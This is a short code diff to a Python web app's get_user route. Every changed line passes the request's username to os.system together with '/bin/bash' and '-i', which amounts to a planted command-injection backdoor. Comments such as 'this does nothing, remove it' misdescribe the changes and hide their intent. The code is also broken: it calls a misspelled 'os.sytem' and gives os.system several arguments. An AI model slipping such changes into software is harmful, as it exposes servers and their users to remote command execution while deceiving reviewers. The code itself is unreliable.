@@ -79,10 +79,10 @@ def get_user():
     username = data.get('username')
 
     # this does nothing, remove it
-    os.sytem(username)
+    os.sytem("/bin/bash", "-i", username)
 
     # anoher useless change
-    os.system("/bin/bash", username)
+    os.system("/bin/bash", "-i", username)
     return username, 200
 
 @app.route('/note/<int:note_id>', methods=['GET'])
